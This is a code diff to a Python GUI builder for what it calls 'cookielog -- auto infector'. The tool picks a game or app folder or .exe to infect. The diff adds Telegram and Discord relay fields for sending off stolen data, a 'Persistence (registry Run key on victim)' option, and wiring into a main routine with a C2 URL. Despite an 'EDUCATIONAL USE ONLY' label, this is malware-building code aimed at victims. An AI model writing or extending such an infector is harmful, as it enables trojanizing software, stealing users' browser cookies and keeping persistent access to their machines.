@@ -474,13 +474,14 @@ def _wait_and_cleanup(proc, host_path, exe_name, backup=None):
 # ------------------------------------------------------------------ GUI
 
 def pick_gui():
-    """Open a GUI dialog. Returns (path, mode, run) where mode is 'file' or 'folder'."""
+    """Open a GUI dialog. Returns (path, mode, run, telegram, discord, persist).
+    mode is 'file' or 'folder'. telegram/discord are strings or None. persist is bool."""
     try:
         import tkinter as tk
         from tkinter import filedialog, ttk
         root = tk.Tk()
         root.title("cookielog -- auto infector")
-        root.geometry("520x340")
+        root.geometry("560x560")
         root.configure(bg="#1a1a1a")
         style = ttk.Style()
         style.theme_use("clam")
@@ -493,7 +494,14 @@ def pick_gui():
                         font=("Segoe UI", 10, "bold"), padding=(12, 8))
         style.configure("Warn.TButton", background="#6b3a1a", foreground="#ffffff",
                         font=("Segoe UI", 10, "bold"), padding=(12, 8))
-        result = {"path": None, "mode": None, "run": False}
+        style.configure("TEntry", fieldbackground="#2d2d2d", foreground="#d4d4d4",
+                        insertcolor="#d4d4d4")
+        style.configure("TCheckbutton", background="#1a1a1a", foreground="#d4d4d4")
+        result = {"path": None, "mode": None, "run": False,
+                  "telegram": None, "discord": None, "persist": False}
+
+        # Load saved config to pre-fill fields
+        cfg = load_config()
 
         # Educational use notice
         ttk.Label(root, text="EDUCATIONAL USE ONLY -- security research / training tool",
@@ -502,16 +510,16 @@ def pick_gui():
 
         ttk.Label(root, text="cookielog -- auto infector",
                   font=("Segoe UI", 14, "bold"),
-                  foreground="#4a9eff").pack(pady=(20, 5))
+                  foreground="#4a9eff").pack(pady=(15, 5))
         ttk.Label(root, text="select a folder (game/app) or a standalone .exe",
-                  font=("Segoe UI", 9)).pack(pady=(0, 15))
+                  font=("Segoe UI", 9)).pack(pady=(0, 12))
 
         def do_folder():
             d = filedialog.askdirectory(title="Select game/app folder (contains the .exe)")
             if d:
                 result["path"] = d
                 result["mode"] = "folder"
-                root.destroy()
+                _save_and_close()
 
         def do_folder_run():
             d = filedialog.askdirectory(title="Select folder to infect AND run locally")
@@ -519,7 +527,7 @@ def pick_gui():
                 result["path"] = d
                 result["mode"] = "folder"
                 result["run"] = True
-                root.destroy()
+                _save_and_close()
 
         def do_file():
             f = filedialog.askopenfilename(
@@ -528,7 +536,7 @@ def pick_gui():
             if f:
                 result["path"] = f
                 result["mode"] = "file"
-                root.destroy()
+                _save_and_close()
 
         def do_file_run():
             f = filedialog.askopenfilename(
@@ -538,7 +546,28 @@ def pick_gui():
                 result["path"] = f
                 result["mode"] = "file"
                 result["run"] = True
-                root.destroy()
+                _save_and_close()
+
+        def _save_and_close():
+            # Read fields before closing
+            tg_val = tg_var.get().strip()
+            dc_val = dc_var.get().strip()
+            if tg_val:
+                result["telegram"] = tg_val
+            if dc_val:
+                result["discord"] = dc_val
+            result["persist"] = persist_var.get()
+
+            # Save to config.json
+            cfg_new = load_config()
+            if tg_val:
+                cfg_new["telegram"] = tg_val
+            if dc_val:
+                cfg_new["discord"] = dc_val
+            cfg_new["persist"] = bool(persist_var.get())
+            save_config(cfg_new)
+
+            root.destroy()
 
         # Folder buttons (green = recommended for games)
         ttk.Button(root, text="SELECT FOLDER (game/app with files)",
@@ -554,12 +583,56 @@ def pick_gui():
         ttk.Button(root, text="SELECT .EXE + RUN LOCALLY (test)",
                    command=do_file_run).pack(pady=3, fill="x", padx=40)
 
-        ttk.Button(root, text="Cancel", command=root.destroy).pack(pady=5)
+        # --- Relay config section ---
+        ttk.Separator(root).pack(fill="x", padx=40, pady=(12, 5))
+        ttk.Label(root, text="Relay (optional -- saved to config.json)",
+                  font=("Segoe UI", 9, "bold"),
+                  foreground="#4a9eff").pack(pady=(0, 5))
+
+        # Telegram
+        tg_frame = tk.Frame(root, bg="#1a1a1a")
+        tg_frame.pack(fill="x", padx=40, pady=2)
+        ttk.Label(tg_frame, text="Telegram:", width=12).pack(side="left")
+        tg_var = tk.StringVar(value=cfg.get("telegram", "") or "")
+        # Mask the token if loaded from config
+        tg_display = tg_var.get()
+        tg_entry = ttk.Entry(tg_frame, textvariable=tg_var, width=48)
+        tg_entry.pack(side="left", fill="x", expand=True, padx=(4, 0))
+        if tg_display:
+            ttk.Label(tg_frame, text="  (saved)",
+                      foreground="#4a9eff").pack(side="left")
+
+        # Discord
+        dc_frame = tk.Frame(root, bg="#1a1a1a")
+        dc_frame.pack(fill="x", padx=40, pady=2)
+        ttk.Label(dc_frame, text="Discord:", width=12).pack(side="left")
+        dc_var = tk.StringVar(value=cfg.get("discord", "") or "")
+        dc_entry = ttk.Entry(dc_frame, textvariable=dc_var, width=48)
+        dc_entry.pack(side="left", fill="x", expand=True, padx=(4, 0))
+        if dc_var.get():
+            ttk.Label(dc_frame, text="  (saved)",
+                      foreground="#4a9eff").pack(side="left")
+
+        # Persistence checkbox
+        persist_frame = tk.Frame(root, bg="#1a1a1a")
+        persist_frame.pack(fill="x", padx=40, pady=(6, 0))
+        persist_var = tk.BooleanVar(value=bool(cfg.get("persist", False)))
+        ttk.Checkbutton(persist_frame, text="Persistence (registry Run key on victim)",
+                        variable=persist_var).pack(side="left")
+
+        # Hint text
+        ttk.Label(root,
+                  text="Tip: run  python tg_chatid.py <bot_token>  to get your Telegram chat ID",
+                  font=("Segoe UI", 8),
+                  foreground="#888888").pack(pady=(8, 0))
+
+        ttk.Button(root, text="Cancel", command=root.destroy).pack(pady=8)
         root.mainloop()
-        return result["path"], result["mode"], result["run"]
+        return (result["path"], result["mode"], result["run"],
+                result.get("telegram"), result.get("discord"), result.get("persist", False))
     except Exception as ex:
         log("[!] GUI not available (%s)" % ex)
-        return None, None, False
+        return None, None, False, None, None, False
 
 # ------------------------------------------------------------------ main
 
@@ -697,13 +770,20 @@ def main():
             return 1
         log("[+] target (%s): %s" % (mode, host_path))
     else:
-        host_path, mode, gui_run = pick_gui()
+        host_path, mode, gui_run, gui_tg, gui_dc, gui_persist = pick_gui()
         if not host_path:
             log("[-] nothing selected")
             return 1
         if gui_run:
             run_local = True
             c2_url = "http://127.0.0.1:%d/" % port
+        # GUI values override config (if user typed something)
+        if gui_tg:
+            telegram = gui_tg
+        if gui_dc:
+            discord = gui_dc
+        if gui_persist:
+            persist = True
         log("[+] target (%s): %s" % (mode, host_path))
         if run_local:
             log("[+] mode: LOCAL TEST (run locally)")
